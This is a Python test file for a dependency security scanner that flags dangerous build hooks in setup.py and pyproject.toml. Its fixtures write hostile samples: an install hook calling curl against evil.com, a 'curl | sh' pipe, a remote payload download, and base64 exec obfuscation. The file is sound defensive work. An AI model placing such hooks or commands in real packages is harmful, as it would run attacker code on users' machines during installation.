"""Tests for PythonBuildScanner — setup.py and pyproject.toml build hooks."""

from __future__ import annotations

import asyncio

import pytest

from depfence.scanners.python_build_scanner import PythonBuildScanner


@pytest.fixture
def scanner():
    return PythonBuildScanner()


def run(scanner, project_dir):
    return asyncio.get_event_loop().run_until_complete(scanner.scan_project(project_dir))


class TestCmdclass:
    def test_cmdclass_override(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("""
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        import subprocess
        subprocess.call(["curl", "http://evil.com/backdoor"])

setup(name="evil", cmdclass = {"install": PostInstall})
""")
        findings = run(scanner, tmp_path)
        py01 = [f for f in findings if f.metadata.get("rule") == "PY-01"]
        assert len(py01) == 1


class TestDangerousImports:
    def test_subprocess_import(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("import subprocess\nfrom setuptools import setup\nsetup(name='x')")
        findings = run(scanner, tmp_path)
        py02 = [f for f in findings if f.metadata.get("rule") == "PY-02"]
        assert len(py02) == 1

    def test_os_system(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("import os\nos.system('curl http://evil.com | sh')\nfrom setuptools import setup\nsetup(name='x')")
        findings = run(scanner, tmp_path)
        py02 = [f for f in findings if f.metadata.get("rule") == "PY-02"]
        assert len(py02) == 1

    def test_clean_setup(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("from setuptools import setup\nsetup(name='safe', version='1.0')")
        findings = run(scanner, tmp_path)
        assert len(findings) == 0


class TestObfuscation:
    def test_exec_base64(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("exec(base64.b64decode('aW1wb3J0IG9z'))")
        findings = run(scanner, tmp_path)
        py03 = [f for f in findings if f.metadata.get("rule") == "PY-03"]
        assert len(py03) == 1
        assert py03[0].severity.name == "CRITICAL"

    def test_dunder_import(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("__import__('os').system('id')")
        findings = run(scanner, tmp_path)
        py03 = [f for f in findings if f.metadata.get("rule") == "PY-03"]
        assert len(py03) == 1


class TestRemoteDownload:
    def test_urlretrieve(self, tmp_path, scanner):
        setup = tmp_path / "setup.py"
        setup.write_text("import urllib.request\nurllib.request.urlretrieve('http://evil.com/payload', '/tmp/p')")
        findings = run(scanner, tmp_path)
        py05 = [f for f in findings if f.metadata.get("rule") == "PY-05"]
        assert len(py05) == 1
        assert py05[0].severity.name == "CRITICAL"


class TestPyproject:
    def test_non_standard_backend(self, tmp_path, scanner):
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[build-system]\nbuild-backend = "evil_backend.build"\n')
        findings = run(scanner, tmp_path)
        py04 = [f for f in findings if f.metadata.get("rule") == "PY-04"]
        assert len(py04) == 1
        assert py04[0].severity.name == "MEDIUM"

    def test_standard_backend_ok(self, tmp_path, scanner):
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[build-system]\nbuild-backend = "setuptools.build_meta"\n')
        findings = run(scanner, tmp_path)
        py04 = [f for f in findings if f.metadata.get("rule") == "PY-04"]
        assert len(py04) == 0

    def test_hatchling_ok(self, tmp_path, scanner):
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[build-system]\nbuild-backend = "hatchling.build"\n')
        findings = run(scanner, tmp_path)
        py04 = [f for f in findings if f.metadata.get("rule") == "PY-04"]
        assert len(py04) == 0


class TestSkipDirs:
    def test_venv_skipped(self, tmp_path, scanner):
        venv_dir = tmp_path / ".venv" / "lib" / "evil"
        venv_dir.mkdir(parents=True)
        setup = venv_dir / "setup.py"
        setup.write_text("exec(base64.b64decode('evil'))")
        findings = run(scanner, tmp_path)
        assert len(findings) == 0
